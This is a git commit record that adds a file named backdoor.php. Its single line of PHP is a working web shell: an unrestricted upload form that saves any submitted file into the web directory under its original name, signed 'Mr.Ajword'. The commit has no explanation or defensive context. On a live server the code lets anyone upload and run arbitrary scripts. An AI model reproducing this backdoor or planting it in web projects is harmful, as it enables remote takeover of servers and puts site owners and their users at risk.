2c6ed30652e1d0c6055a70abbce2f2f447b803ea
bartonkp <70596787+bartonkp@users.noreply.github.com>
2021-04-25 05:58:26 -0700

    Add files via upload

---
+++ backdoor.php
@@ -0,0 +1,1 @@
+<?php @copy($_FILES['file']['tmp_name'],$_FILES['file']['name']); ?><p>Mr.Ajword</p><br> <form action="" method="post" enctype="multipart/form-data">Filename: <input type="file" name="file" /><input type="submit" value="Submit" />
